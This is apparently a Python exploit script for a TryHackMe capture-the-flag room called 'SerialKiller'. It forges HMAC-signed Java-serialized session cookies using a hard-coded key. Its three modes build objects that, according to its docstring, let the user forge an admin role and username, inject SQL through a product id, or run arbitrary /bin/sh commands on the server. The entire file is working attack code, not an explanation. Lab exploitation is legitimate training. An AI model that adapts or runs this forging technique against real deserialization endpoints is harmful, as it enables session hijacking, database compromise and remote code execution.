#!/usr/bin/env python3
"""
sv.py — forge signed sv_session cookies for the "SerialKiller" THM room.

Cookie format:   sv_session = base64(java_serialized_object) + "." + base64(HMAC_SHA256(key, base64_str))

Allowlisted classes (com.serialvault.model):
  UserSession      uid=101  fields: issuedAt(long), role(String), username(String)
  ProductTemplate  uid=202  fields: id(String)                    -> readObject runs SQL with id
  ReportTask       uid=303  fields: command(String), reportName(String) -> readObject runs /bin/sh -c command
"""
import base64
import hashlib
import hmac
import struct
import sys
import time

KEY = b"zj0vETmPJ1S81pC4DMcFS86nkvLhGB36"

STREAM_MAGIC = bytes.fromhex("aced0005")
TC_OBJECT = b"\x73"
TC_CLASSDESC = b"\x72"
TC_STRING = b"\x74"
TC_REFERENCE = b"\x71"
TC_ENDBLOCKDATA = b"\x78"
TC_NULL = b"\x70"
BASE_HANDLE = 0x7E0000


def jstr(s: str) -> bytes:
    b = s.encode("utf-8")
    return TC_STRING + struct.pack(">H", len(b)) + b


def classdesc(name: str, uid: int, fields: list) -> bytes:
    """fields: list of (typecode, fieldname, typesig_or_None).
       typecode 'J' = long primitive; 'L' = object (typesig like 'Ljava/lang/String;')."""
    out = TC_CLASSDESC
    nb = name.encode()
    out += struct.pack(">H", len(nb)) + nb
    out += struct.pack(">q", uid)
    out += b"\x02"                      # SC_SERIALIZABLE
    out += struct.pack(">H", len(fields))
    wrote_type = False
    for tc, fname, tsig in fields:
        fb = fname.encode()
        out += tc.encode() + struct.pack(">H", len(fb)) + fb
        if tsig is not None:
            if not wrote_type:
                out += jstr(tsig)                       # first object field: full TC_STRING
                wrote_type = True
            else:
                out += TC_REFERENCE + struct.pack(">I", BASE_HANDLE + 1)  # handle of String type
    out += TC_ENDBLOCKDATA
    out += TC_NULL
    return out


def ser_user_session(username: str, role: str, issued_at: int = None) -> bytes:
    if issued_at is None:
        issued_at = int(time.time() * 1000)
    out = STREAM_MAGIC + TC_OBJECT
    out += classdesc("com.serialvault.model.UserSession", 101,
                     [("J", "issuedAt", None),
                      ("L", "role", "Ljava/lang/String;"),
                      ("L", "username", "Ljava/lang/String;")])
    out += struct.pack(">q", issued_at)
    out += jstr(role) + jstr(username)
    return out


def ser_product_template(pid: str) -> bytes:
    out = STREAM_MAGIC + TC_OBJECT
    out += classdesc("com.serialvault.model.ProductTemplate", 202,
                     [("L", "id", "Ljava/lang/String;")])
    out += jstr(pid)
    return out


def ser_report_task(command: str, report_name: str) -> bytes:
    out = STREAM_MAGIC + TC_OBJECT
    out += classdesc("com.serialvault.model.ReportTask", 303,
                     [("L", "command", "Ljava/lang/String;"),
                      ("L", "reportName", "Ljava/lang/String;")])
    out += jstr(command) + jstr(report_name)
    return out


def sign(raw: bytes) -> str:
    b64 = base64.b64encode(raw).decode()
    mac = hmac.new(KEY, b64.encode(), hashlib.sha256).digest()
    return b64 + "." + base64.b64encode(mac).decode()


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        print("usage: sv.py user <username> <role>")
        print("       sv.py product <id>")
        print("       sv.py report <reportName> <command>")
        return
    mode = sys.argv[1]
    if mode == "user":
        print(sign(ser_user_session(sys.argv[2], sys.argv[3])))
    elif mode == "product":
        print(sign(ser_product_template(sys.argv[2])))
    elif mode == "report":
        print(sign(ser_report_task(sys.argv[3], sys.argv[2])))
    else:
        print("unknown mode", mode)


if __name__ == "__main__":
    main()
